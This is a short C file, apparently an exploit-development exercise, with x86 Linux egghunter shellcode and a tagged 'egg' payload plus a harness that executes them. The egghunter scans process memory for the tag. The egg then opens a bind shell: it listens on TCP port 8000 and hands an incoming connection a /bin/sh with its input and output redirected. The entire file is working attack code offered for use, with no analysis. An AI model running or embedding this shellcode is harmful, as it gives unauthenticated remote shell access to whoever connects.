// Egghunter shellcode
// Author: buffered4ever
// 15-03-2019

#include <stdio.h>
#include <string.h>

unsigned char egg_hunter[] = \
"\x66\x81\xc9\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\x31\xc0\xb8\x74\x6f\x6f\x77\x89\xcf\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";


unsigned char egg[] = \
"\x74\x6f\x6f\x77\x74\x6f\x6f\x77\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\x31\xc0\xb0\x66\x31\xdb\xb3\x01\xcd\x80\x89\xc7\x52\x66\x68\x1f\x40\x66\x6a\x02\x89\xe3\x6a\x10\x53\x57\x31\xdb\xb3\x02\x31\xc0\xb0\x66\x89\xe1\xcd\x80\x52\x57\x89\xe1\x31\xdb\xb3\x04\x31\xc0\xb0\x66\xcd\x80\x52\x52\x57\x89\xe1\x31\xdb\xb3\x05\x31\xc0\xb0\x66\xcd\x80\x89\xc3\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc2\x89\xc1\xb0\x0b\xcd\x80";
	      
	      
main()
{
	printf("Egghunter Shellcode Length: %d\n", strlen(egg_hunter));
	printf("Egg Shellcode Length: %d\n", strlen(egg));
	int (*ret)() = (int(*)())egg_hunter;
	ret();
}
